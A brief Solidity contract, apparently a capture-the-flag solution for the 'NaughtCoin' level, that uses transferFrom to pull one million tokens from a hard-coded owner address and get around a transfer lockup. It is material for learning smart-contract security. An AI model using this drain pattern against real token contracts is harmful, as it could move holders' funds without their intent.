// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract NaughtCoin {
    
    function drain(address _contract) external {
        address owner = 0xa8CF219AD8E7f1fE2087DFF5dC9196A56695B170;
        uint256 amount = 1000000 * 10 ** 18;
        (bool success, ) = _contract.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", owner, _contract, amount));
        require(success, "Draining of contract failed!");
    }
    
    function getAmount() external pure returns(bytes32) {
        return bytes32(uint256(1000000 * 10 ** 18));
    }
}
